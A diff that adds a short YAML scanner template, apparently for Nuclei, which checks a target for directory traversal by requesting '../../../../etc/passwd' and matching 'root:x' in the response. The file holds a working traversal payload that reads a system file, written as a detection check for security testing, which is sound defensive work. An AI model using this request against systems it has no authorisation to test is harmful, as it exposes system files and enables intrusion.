@@ -1,0 +1,15 @@
+id: directory-traversal
+info:
+  name: Directory Traversal Vulnerability
+  severity: high
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../../etc/passwd"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x"
